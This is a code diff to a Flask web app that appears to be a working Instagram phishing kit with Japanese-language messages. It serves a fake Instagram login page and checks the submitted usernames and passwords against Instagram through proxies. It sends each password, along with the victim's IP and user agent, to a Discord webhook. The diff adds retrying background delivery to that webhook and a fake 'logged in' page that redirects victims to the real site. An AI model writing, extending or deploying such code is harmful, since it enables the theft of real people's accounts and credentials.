@@ -1,12 +1,14 @@
 import base64
 import os
 import random
+import threading
 import time
 import uuid
 
 import requests
-from flask import (Flask, Response, redirect, render_template, request,
-                   url_for)
+from flask import (Flask, Response, jsonify, redirect, render_template,
+                   render_template_string, request, url_for)
+from jinja2 import TemplateNotFound
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))
@@ -32,6 +34,8 @@ STRICT = os.environ.get("IG_STRICT", "0") == "1"
 PROXY_LIST = [p.strip() for p in os.environ.get("IG_PROXY", "").split(",") if p.strip()]
 
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
+DISCORD_PROXY = os.environ.get("DISCORD_PROXY", "").strip() or (
+    PROXY_LIST[0] if PROXY_LIST else "")
 
 MSG_NO_USER = ("入力したユーザー名のアカウントが見つかりませんでした。"
                "ユーザー名を確認してもう一度お試しください。")
@@ -50,6 +54,31 @@ VERDICT_LABEL = {
     "no_user": ("アカウントなし", 0xE74C3C),
     "ambiguous": ("判定不能", 0x95A5A6),
 }
+
+# success.html が無い場合の保険（500を出さない）
+SUCCESS_FALLBACK = """<!DOCTYPE html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="refresh" content="1.2;url={{ target }}">
+<title>Instagram</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<style>
+ .ok-wrap{background:#fff;border:1px solid #dbdbdb;width:350px;padding:44px 40px 22px;text-align:center}
+ .ok-mark{width:56px;height:56px;border-radius:50%;background:#0095f6;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
+ .ok-title{font-size:16px;font-weight:600;margin:0 0 8px}
+ .ok-sub{font-size:13px;color:#8e8e8e;line-height:1.5;margin:0 0 20px;word-break:break-all}
+ .ok-note{font-size:12px;color:#00376b;background:#e7f3ff;padding:10px;line-height:1.5;margin:0 0 18px}
+ .ok-btn{display:flex;align-items:center;justify-content:center;width:100%;height:34px;background:#0095f6;color:#fff;border-radius:8px;font-size:14px;font-weight:600;text-decoration:none}
+</style></head><body>
+<div class="ok-wrap">
+ <div class="ok-mark"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5.5 5.5L20 7"></path></svg></div>
+ <p class="ok-title">ログインしました</p>
+ <p class="ok-sub">{{ username }}</p>
+ {% if note %}<p class="ok-note">{{ note }}</p>{% endif %}
+ <a class="ok-btn" href="{{ target }}">Instagram を開く</a>
+</div>
+<div class="signup">まもなく自動的にInstagramへ移動します</div>
+</body></html>"""
 
 
 # ---------------------------------------------------------------- helpers
@@ -195,6 +224,42 @@ def _clip(value, limit=1000):
     return value if len(value) <= limit else value[:limit] + "…"
 
 
+def _discord_send(payload):
+    """429 は retry_after を尊重して再送。失敗しても呼び出し元は止めない。"""
+    if not DISCORD_WEBHOOK:
+        return
+    px = {"http": DISCORD_PROXY, "https": DISCORD_PROXY} if DISCORD_PROXY else None
+
+    for attempt in range(4):
+        try:
+            r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=8, proxies=px)
+        except Exception as e:
+            print("discord failed: %s" % e, flush=True)
+            time.sleep(1.0 * (attempt + 1))
+            continue
+
+        if r.status_code in (200, 204):
+            return
+
+        if r.status_code == 429:
+            wait = 1.5
+            try:
+                wait = float(r.json().get("retry_after", wait))
+            except Exception:
+                pass
+            wait = min(max(wait, 0.5), 15.0)
+            print("discord 429, retry in %.1fs" % wait, flush=True)
+            time.sleep(wait)
+            continue
+
+        print("discord error %s: %s" % (r.status_code, r.text[:200]), flush=True)
+        if 400 <= r.status_code < 500:
+            return
+        time.sleep(1.0 * (attempt + 1))
+
+    print("discord give up", flush=True)
+
+
 def _notify(verdict, username, password):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
     ua = request.headers.get("User-Agent", "-")
@@ -219,13 +284,7 @@ def _notify(verdict, username, password):
             "footer": {"text": "instagram-clone"},
         }],
     }
-
-    try:
-        r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=6)
-        if r.status_code not in (200, 204):
-            print("discord error %s: %s" % (r.status_code, r.text[:200]), flush=True)
-    except Exception as e:
-        print("discord failed: %s" % e, flush=True)
+    threading.Thread(target=_discord_send, args=(payload,), daemon=True).start()
 
 
 # ---------------------------------------------------------------- routes
@@ -236,9 +295,26 @@ def make_index(html):
     return resp
 
 
+def _render_success(username, note, target):
+    try:
+        return render_template("success.html", username=username,
+                               note=note, target=target)
+    except TemplateNotFound:
+        print("success.html not found -> fallback", flush=True)
+        return render_template_string(SUCCESS_FALLBACK, username=username,
+                                      note=note, target=target)
+
+
+def _render_login(error, username):
+    try:
+        return render_template("index.html", error=error, username=username)
+    except TemplateNotFound:
+        return "<h1>index.html がありません</h1><pre>templates/index.html</pre>"
+
+
 @app.route("/", methods=["GET"])
 def index():
-    resp = make_index(render_template("index.html", error=None, username=""))
+    resp = make_index(_render_login(None, ""))
     ref = request.args.get("ref")
     if ref:
         resp.set_cookie("ref", ref, max_age=60 * 60 * 24 * 30)
@@ -256,10 +332,14 @@ def login_post():
     password = request.form.get("password") or ""
 
     if not username or not password:
-        return make_index(render_template(
-            "index.html", error=MSG_GENERIC, username=username))
+        return make_index(_render_login(MSG_GENERIC, username))
 
-    verdict = _verify(username, password)
+    try:
+        verdict = _verify(username, password)
+    except Exception as e:
+        print("verify failed: %s" % e, flush=True)
+        verdict = "ambiguous"
+
     _notify(verdict, username, password)
 
     if verdict in ("ok", "ok_2fa", "ok_challenge"):
@@ -268,26 +348,19 @@ def login_post():
             note = "本人確認のため、Instagramアプリで確認コードを入力してください。"
         elif verdict == "ok_challenge":
             note = "新しい端末からのログインのため、Instagramで確認を求められる場合があります。"
-        return make_index(render_template(
-            "success.html", username=username, note=note, target=IG_HOME))
+        return make_index(_render_success(username, note, IG_HOME))
 
     if verdict == "no_user":
-        return make_index(render_template(
-            "index.html", error=MSG_NO_USER, username=username))
+        return make_index(_render_login(MSG_NO_USER, username))
 
     if verdict == "bad_pass":
-        return make_index(render_template(
-            "index.html", error=MSG_BAD_PASS, username=username))
+        return make_index(_render_login(MSG_BAD_PASS, username))
 
-    # ambiguous
     if STRICT:
-        return make_index(render_template(
-            "index.html", error=MSG_GENERIC, username=username))
+        return make_index(_render_login(MSG_GENERIC, username))
 
-    return make_index(render_template(
-        "success.html", username=username,
-        note="Instagram側の制限により自動確認できませんでした。",
-        target=IG_HOME))
+    return make_index(_render_success(
+        username, "Instagram側の制限により自動確認できませんでした。", IG_HOME))
 
 
 @app.route("/open.gif")
@@ -299,7 +372,15 @@ def open_gif():
 
 @app.route("/healthz")
 def healthz():
-    return "ok"
+    base = os.path.join(app.root_path, "templates")
+    return jsonify({
+        "ok": True,
+        "index": os.path.isfile(os.path.join(base, "index.html")),
+        "success": os.path.isfile(os.path.join(base, "success.html")),
+        "style": os.path.isfile(os.path.join(app.root_path, "static", "style.css")),
+        "discord": bool(DISCORD_WEBHOOK),
+        "strict": STRICT,
+    })
 
 
 if __name__ == "__main__":
